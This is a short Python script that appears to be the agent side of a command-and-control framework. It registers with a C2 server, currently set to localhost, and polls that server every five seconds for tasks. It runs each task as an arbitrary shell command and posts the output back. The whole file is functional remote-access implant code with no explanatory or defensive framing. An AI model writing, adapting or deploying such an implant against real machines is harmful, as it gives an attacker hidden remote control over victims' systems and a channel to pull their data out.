import requests
import time
import subprocess

C2_URL = "http://localhost:5000"
agent_id = None

def register():
    global agent_id
    res = requests.post(f"{C2_URL}/register")
    agent_id = res.json().get("agent_id")

def beacon():
    res = requests.post(f"{C2_URL}/beacon", json={"agent_id": agent_id})
    return res.json().get("task")

def submit(output):
    requests.post(f"{C2_URL}/submit", json={"agent_id": agent_id, "output": output})

def run():
    register()
    while True:
        task = beacon()
        if task and task != "none":
            try:
                result = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT, timeout=15)
                output = result.decode()
            except Exception as e:
                output = str(e)
            submit(output)
        time.sleep(5)

if __name__ == '__main__':
    run()